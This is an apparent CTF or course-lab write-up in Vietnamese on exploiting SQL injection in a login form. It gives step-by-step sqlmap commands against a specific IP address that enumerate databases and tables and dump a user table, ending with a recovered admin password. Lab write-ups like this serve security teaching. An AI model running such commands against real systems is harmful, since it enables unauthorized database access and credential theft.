---
title: sql injection - CMU-CS 428 SAIS
date: 2020-08-03T03:20:55.578Z
draft: false
categories:
  - CTF
tags:
  - sqli
  - sqlmap
---
Truy cập vào trang web. Ta thấy duy nhất 1 khung login.

![](/img/2020-08-03_10-24.png)

Thử tiêm một đoạn sql vào để kiểm tra khung login này có bị lỗi không

![](/img/2020-08-03_10-31.png)

Thông báo login success, chứng tỏ đoạn sql được thực thi. Tuy nhiên ta không biết được câu query trong mã nguồn là gì vì khi câu sql tiêm vào bị lỗi thì server sẽ trả về như hình mà không có thông tin gì thêm như câu query bị lỗi hay thông tin database server.

![](/img/2020-08-03_10-39.png)

Chúng ta sẽ sử dụng `sqlmap` để khai thác SQL Injection. SQLmap có sẵn các payload để tiêm vào và dựa trên việc server có trả về lỗi không để khai thác tiếp.

![](/img/2020-08-03_10-45.png)

Chạy `--sqlmap-shell` để chạy shell riêng của `sqlmap` (tránh việc shell hệ thống lưu lịch sử câu lệnh) và `-v 0` để set verbose về 0 tức `sqlmap` sẽ không in ra những thông báo.
Sau khi vào shell, dùng `-u <url web>` để chọn target. Và ta thấy web sử dụng form để gửi dữ liệu nên ta thêm `--forms` để `sqlmap` nhận dạng form cần tiêm sql. Ta có thể thêm `--batch` để sqlmap tự trả lời các prompts.

```shell
sqlmap-shell> -u https://103.7.177.38/ --forms --batch
```

![](/img/2020-08-03_10-58.png)

Như vậy `sqlmap` đã tự phát hiện form và test từng field trong form để khai thác sql injection. Mặc định khi chúng ta không chọn options nào để khai thác thì `sqlmap` chỉ in ra thông tin cơ bản của Database như tên hệ quản trị và version.

Giờ chúng ta thử khai thác thêm như in ra các tên databases, ta dùng `--dbs`

```shell
sqlmap-shell> -u https://103.7.177.38/ --forms --batch --dbs
```

![](/img/2020-08-03_11-06.png)

Thêm `--current-db` để biết web đang dùng database nào.

```shell
sqlmap-shell> -u https://103.7.177.38/ --forms --batch --current-db
```

![](/img/2020-08-03_11-09.png)

Tiếp tục dùng `-D <tên database>` để chọn database cần khai thác và `--tables` để in ra hết tên tables nằm trong database. Ở đây database là `labsql` mà ta đã tìm được trước đó.

```shell
sqlmap-shell> -u https://103.7.177.38/ --forms --batch -D labsql --tables
```

![](/img/2020-08-03_11-14.png)

Chỉ có 1 table. Chọn table bằng `T <tên table>` và in ra columns `--columns` hoặc dump hết data `--dump`.

```shell
sqlmap-shell> -u https://103.7.177.38/ --forms --batch -D labsql -T user --columns --dump
```

![](/img/2020-08-03_11-17.png)

Như vậy là ta có thể thấy được password của admin là `mypasssword#@!$1234`.